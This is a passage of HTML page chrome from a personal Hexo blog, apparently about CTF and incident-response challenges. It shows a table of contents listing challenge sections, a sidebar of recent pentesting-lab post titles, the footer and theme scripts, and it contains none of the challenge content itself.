toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacked"><span class="toc-text">hacked</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hard-web"><span class="toc-text">hard_web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3"><span class="toc-text">1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-text">方法二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IncidentResponse"><span class="toc-text">IncidentResponse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5"><span class="toc-text">5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6"><span class="toc-text">6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7"><span class="toc-text">7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SmallSword"><span class="toc-text">SmallSword</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcpdump"><span class="toc-text">tcpdump</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6"><span class="toc-text">1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-text">法二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1"><span class="toc-text">5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wireshark"><span class="toc-text">wireshark</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3"><span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#server-save"><span class="toc-text">server_save</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-8"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2"><span class="toc-text">5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1"><span class="toc-text">6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%818"><span class="toc-text">7、8</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-DailyBugle/" title="Offensive Pentesting-DailyBugle">Offensive Pentesting-DailyBugle</a><time datetime="2024-11-26T09:04:51.489Z" title="发表于 2024-11-26 17:04:51">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-GameZone/" title="Offensive Pentesting-GameZone">Offensive Pentesting-GameZone</a><time datetime="2024-11-26T09:04:48.797Z" title="发表于 2024-11-26 17:04:48">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Kenobi/" title="Offensive Pentesting-Kenobi">Offensive Pentesting-Kenobi</a><time datetime="2024-11-26T09:04:45.988Z" title="发表于 2024-11-26 17:04:45">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Skynet/" title="Offensive Pentesting-Skynet">Offensive Pentesting-Skynet</a><time datetime="2024-11-26T09:04:38.428Z" title="发表于 2024-11-26 17:04:38">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Vulnversity/" title="Offensive Pentesting-Vulnversity">Offensive Pentesting-Vulnversity</a><time datetime="2024-11-26T09:04:30.499Z" title="发表于 2024-11-26 17:04:30">2024-11-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
   function initValine () {
     const valine = new Valine(Object.assign({
       el: '#vcomment',
